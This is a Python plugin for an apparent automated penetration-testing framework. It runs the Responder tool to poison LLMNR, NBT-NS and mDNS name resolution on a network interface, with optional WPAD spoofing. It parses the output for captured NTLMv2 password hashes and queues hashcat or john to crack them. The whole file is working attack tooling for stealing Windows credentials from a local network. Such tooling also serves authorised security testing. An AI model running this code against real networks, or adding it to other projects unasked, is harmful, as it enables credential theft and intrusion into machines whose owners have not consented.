import re
from typing import Any, Dict, List
from plugins import register
from plugins.base import BaseTool, ToolResult

@register
class ResponderPlugin(BaseTool):
    name = "responder"
    description = "LLMNR/NBT-NS/mDNS poisoner: captures NTLMv2 hashes from Windows machines."
    category = "exploit"
    requires = ["responder"]

    async def run(self, target: str, options: Dict[str, Any]) -> ToolResult:
        duration = options.get("duration", 60)
        wpad = options.get("wpad", False)
        interface = target  # target = interface name
        cmd = ["responder", "-I", interface, "-v"]
        if wpad:
            cmd.append("-w")
        stdout, stderr, rc = await self._exec(cmd, timeout=duration + 10)
        findings = self._parse(stdout + stderr)
        return ToolResult(
            tool=self.name, target=target, success=bool(findings),
            raw_output=stdout, findings=findings,
            suggested_next=["hashcat", "john"] if findings else [],
            risk_score=9.0 if findings else 0.0,
            metadata={"interface": interface, "duration": duration},
        )

    def _parse(self, output: str) -> List[Dict]:
        findings = []
        for line in output.splitlines():
            m = re.search(r"\[(.+?)\] (.+?) - Sending (.+?) to (.+)", line)
            if m:
                findings.append({"protocol": m.group(1), "host": m.group(4), "type": m.group(3)})
            ntlm = re.search(r"NTLMv2-SSP Hash\s*:\s*(.+)", line)
            if ntlm:
                findings.append({"type": "NTLMv2", "hash": ntlm.group(1).strip()})
        return findings
